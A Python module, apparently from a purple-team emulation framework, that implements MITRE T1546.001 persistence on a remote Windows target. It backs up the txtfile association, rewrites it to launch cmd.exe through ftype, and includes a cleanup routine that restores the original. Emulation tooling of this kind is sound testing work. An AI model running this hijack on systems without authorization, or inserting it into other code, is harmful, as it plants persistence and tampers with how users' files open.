from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)
_backed_up_targets: set[str] = set()


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Change a file association for persistence."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        backup_cmd = (
            "$ErrorActionPreference = 'Stop'; "
            "if (Test-Path -LiteralPath 'C:\\Windows\\Temp\\purplestrike_assoc_backup.txt') "
            "{ throw 'Previous association backup exists; restore it before rerunning' }; "
            "$original = cmd /c 'ftype txtfile'; "
            "if ($LASTEXITCODE -ne 0) { throw 'Cannot read original txtfile association' }; "
            "Set-Content -Path 'C:\\Windows\\Temp\\purplestrike_assoc_backup.txt' "
            "-Value $original"
        )
        backup = await conn.run_ps(backup_cmd)
        if not backup.success:
            raise RuntimeError(backup.stderr or backup.stdout or "Association backup failed")
        _backed_up_targets.add(target)
        change_cmd = "cmd /c 'ftype txtfile=C:\\Windows\\System32\\cmd.exe %1'"
        result = await conn.run_ps(change_cmd)
        return TechniqueResult(
            technique_id="T1546.001",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1546.001 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1546.001",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        if target not in _backed_up_targets:
            return
        conn = await get_connection(target)
        restore_cmd = (
            "$ErrorActionPreference = 'Stop'; "
            "if (-not (Test-Path -LiteralPath 'C:\\Windows\\Temp\\purplestrike_assoc_backup.txt')) "
            "{ return }; "
            "$backup = Get-Content -Raw -LiteralPath "
            "'C:\\Windows\\Temp\\purplestrike_assoc_backup.txt'; "
            "cmd /c ('ftype ' + $backup.Trim()); "
            "if ($LASTEXITCODE -ne 0) { throw 'Association restore failed; backup retained' }; "
            "Remove-Item -Path 'C:\\Windows\\Temp\\purplestrike_assoc_backup.txt' -Force"
        )
        restored = await conn.run_ps(restore_cmd)
        if not restored.success:
            raise RuntimeError(restored.stderr or restored.stdout or "Association restore failed")
        _backed_up_targets.discard(target)
    except Exception as e:
        logger.warning(f"T1546.001 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
